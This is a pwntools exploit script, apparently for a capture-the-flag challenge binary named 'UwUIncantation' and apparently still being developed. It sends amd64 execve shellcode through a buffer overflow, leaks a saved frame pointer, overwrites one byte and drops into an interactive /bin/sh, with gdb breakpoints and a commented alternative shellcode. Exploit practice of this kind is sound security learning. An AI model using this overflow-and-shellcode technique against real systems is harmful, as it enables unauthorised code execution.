from pwn import * 

binary = "./UwUIncantation"
p = process(binary)
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'
context.arch = 'amd64'

gdb_script = '''
b * UwU_main
b * UwU_main+271
b * UwU_incantation
b * UwU_read
b * UwU_incantation+41
'''

# don't know why the program continue from UwU_main+257 every time
gdb.attach(p, gdb_script)

# First interaction: precise 9-byte overflow to trigger leak
shellcode = asm('''
    push rax
    pop rdi
    push 59
    pop rax
    syscall
''', arch='amd64')
print(p.recvuntil("UwU?"))
payload = shellcode + b'AA'  # Exactly 9 bytes to get leak, that one byte would overwrite old rbp, but null byte can restore it
# since the old rbp in this context always ends in null byte
p.sendline(payload)

# Capture and analyze the leak
#leak = p.recvuntil("UwU")

p.recvuntil("AA")
leak = int.from_bytes(p.recvuntil("!", drop = True), 'little') << 8#& 0xffffffffffffff00
print("Leaked data:", hex(leak)) # leaks old rbp, but need to somehow restore the last byte

#print("Hex dump of leak:", hex(u64(leak)))

# Continue with rest of interaction
print(p.recvuntil(b"UwU\n"))
p.sendline("27.0")  # Valid power level

# Third interaction
print(p.recvuntil("prowess!\n"))

payload = b"/bin/sh\x00" + b"\x30" #* 8 # Exactly 9 bytes to get leak
#payload = p64(leak +0x98) + b"\x70" # bruteforce this byte and 0x98
p.sendline(payload)

p.interactive()


'''
xor esi, esi
push rax
pop rdi
push 0x3b
pop rax
xor BYTE PTR [rdi+7], 1
xor edx, edx
syscall

'''